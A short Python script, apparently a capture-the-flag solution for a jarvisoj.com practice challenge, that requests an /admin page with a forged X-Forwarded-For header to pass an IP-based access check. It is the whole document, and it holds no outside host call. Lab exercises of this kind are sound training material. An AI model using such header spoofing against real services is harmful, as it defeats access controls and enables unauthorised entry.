import requests

headers = {
    'X-Forwarded-For': '103.27.76.153'
}

print(requests.get('http://web.jarvisoj.com:32782/admin', headers=headers).text)
